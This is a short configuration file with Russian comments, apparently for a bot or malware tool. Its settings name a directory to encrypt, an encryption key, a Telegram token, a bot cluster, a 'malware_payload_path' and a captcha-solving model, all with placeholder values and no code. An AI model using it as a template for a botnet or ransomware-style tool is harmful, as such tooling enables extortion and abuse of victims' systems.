[system]
# Адрес сервера для подключения
server_address = 127.0.0.1

# Порт сервера для подключения
server_port = 8080

# (info, debug, warn, error)
log_level = info

# Директория для шифрования файлов
encrypt_directory = /data

# Путь к файлу конфигурации для email
email_config = config/email.conf

# Токен для Telegram API
telegram_token = telegram-token

# Ключ для шифрования данных
encryption_key = default_key

# Максимальное количество одновременных задач
max_concurrent_tasks = 128

# Порт для REST API сервера
api_port = 8081

# Конфигурация кластера ботов
cluster_config = config/cluster.conf

# Путь к файлу с нагрузкой
malware_payload_path = payload.bin

# Путь к модели для решения капч
captcha_model_path = path/to/model

# Путь к изображению капчи для решения
captcha_image_path = path/to/captcha/image.png

